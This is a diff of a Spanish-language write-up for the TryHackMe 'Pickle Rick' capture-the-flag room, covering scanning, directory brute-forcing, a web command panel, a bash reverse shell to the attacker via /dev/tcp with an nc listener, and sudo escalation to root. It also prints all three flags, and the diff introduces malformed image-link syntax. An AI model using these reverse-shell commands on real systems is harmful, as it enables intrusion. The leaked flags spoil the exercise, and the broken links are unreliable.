@@ -1,8 +1,8 @@
 # Pickle Rick
 
-![image.png](./IMAGENES/IMAGENES_PICKLERICK/image.png)
+![image.png](](./imagenes/Imagenes_PickleRick/image.png)
 
-Maquinas que vamos a utilizar Kali Llinux y Pickle Rick  [https://tryhackme.com/room/picklerick](./IMAGENES/IMAGENES_PICKLERICK/https://tryhackme.com/room/picklerick)
+Maquinas que vamos a utilizar Kali Llinux y Pickle Rick  [https://tryhackme.com/room/picklerick](](./imagenes/Imagenes_PickleRick/https://tryhackme.com/room/picklerick)
 
 - Vamos a mirar nuestra IP
     
@@ -10,14 +10,14 @@ Maquinas que vamos a utilizar Kali Llinux y Pickle Rick  [https://tryhackme.com/
     ifconfig
     ```
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%201.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%201.png)
     
     En este caso como estamos en un VPN nuestra Ip esta en el interface tun0: IP : **10.21.203.172**
     
 
 - La IP de la maquina victima es: **10.10.214.144**
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%202.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%202.png)
     
 
 ---
@@ -26,15 +26,15 @@ Maquinas que vamos a utilizar Kali Llinux y Pickle Rick  [https://tryhackme.com/
 sudo nmap -p- -sS -sV --min-rate=5000 -n -vvv -Pn 10.10.214.144
 ```
 
-![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%203.png)
+![image.png](](./imagenes/Imagenes_PickleRick/image%203.png)
 
 - Vamos a ver lo que esta corriendo en el puerto 80 atraves del navegador web.
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%204.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%204.png)
     
     - Inspeccionamos el código fuente de la web `CTRL+U`
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%205.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%205.png)
         
         Tenemos nuestra primera posible pista. un nombre de usuario:  `R1ckRul3s`
         
@@ -42,31 +42,31 @@ sudo nmap -p- -sS -sV --min-rate=5000 -n -vvv -Pn 10.10.214.144
 - Listamos directorios con Gobuster y buscamos posibles archivos con distintas extensiones.
     
     ```bash
-    gobuster dir -u [http://10.10.214.144/](./IMAGENES/IMAGENES_PICKLERICK/http://10.10.214.144/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
+    gobuster dir -u [http://10.10.214.144/](](./imagenes/Imagenes_PickleRick/http://10.10.214.144/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
     ```
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%206.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%206.png)
     
     Encontramos una posible ruta donde probar el usuario que hemos encontrado así como el archivo robots.txt el cual vamos a mirar su contenido.
     
     - Contenido del robots.txt
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%207.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%207.png)
         
         Nos lo apuntamos por si es alguna contraseña o nos pueda servir para algo mas adelante. `Wubbalubbadubdub`
         
     - Vamos a la pagina de Login.php y probamos el usuario y la posible contraseña que hemos encontrado
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%208.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%208.png)
         
     - Nos encontramos una barra de comandos que responde a comandos de Linux aunque no a todos. Hacemos un `ls`  y vemos varios archivos de texto que puede ser interesantes.
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%209.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%209.png)
         
     
     - Escribimos `less Sup3rS3cretPickl3Ingred.txt`
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2010.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2010.png)
         
          Ya tenemos la primera Flag: `mr. meeseek hair`
         
@@ -75,7 +75,7 @@ sudo nmap -p- -sS -sV --min-rate=5000 -n -vvv -Pn 10.10.214.144
 - Aprovechando que acepta comando vamos a intentar introducir un código para crear un reverse Shell.
     - Nos vamos a la web: https://www.revshells.com/
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2011.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2011.png)
         
         Obtenemos esta reverse Shell **`sh** -i >& /dev/tcp/**10.21.203.172**/**443** 0>&1` pero debemos adaptarla para que nos la coja correctamente añadiendo al principio `bash -c` y la revershell es importante ponerlo entre comillas rectas `" "`.
         
@@ -87,15 +87,15 @@ sudo nmap -p- -sS -sV --min-rate=5000 -n -vvv -Pn 10.10.214.144
         sudo nc -nlvp 443  
         ```
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2012.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2012.png)
         
     - Lanzamos el comando de la Reverse Shell
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2013.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2013.png)
         
         Obtenemos una conexio
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2014.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2014.png)
         
 
 ---
@@ -135,7 +135,7 @@ Nos colocamos en la terminal de la maquina victima.
         
         `ls -la`
         
-        ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2015.png)
+        ![image.png](](./imagenes/Imagenes_PickleRick/image%2015.png)
         
 
 - Miramos dentro de la carpeta rick
@@ -144,14 +144,14 @@ Nos colocamos en la terminal de la maquina victima.
     
     `ls -la`
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2016.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2016.png)
     
 
 - Miramos el contenido del archivo
     
     `cat 'second ingredients’`
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2017.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2017.png)
     
     Ya tenemos la segunda Flag: `1 jerry tear`
     
@@ -162,7 +162,7 @@ Vamos a intentar escalar privilegios con Sudo -l
 
 - `sudo -l`
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2018.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2018.png)
     
     Vemos que podemos ser root sin necesidad de contraseña.
     
@@ -170,7 +170,7 @@ Vamos a intentar escalar privilegios con Sudo -l
     
     `whoami`
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2019.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2019.png)
     
 - Seguimos investigando y vamos a la carpeta root
     
@@ -178,13 +178,13 @@ Vamos a intentar escalar privilegios con Sudo -l
     
     `ls -la`
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2020.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2020.png)
     
 
 - Miramos el contenido del archivo 3rd.txt
     
     `cat 3rd.txt` 
     
-    ![image.png](./IMAGENES/IMAGENES_PICKLERICK/image%2021.png)
+    ![image.png](](./imagenes/Imagenes_PickleRick/image%2021.png)
     
     Ya tenemos la tercera Flag: `fleeb juice`
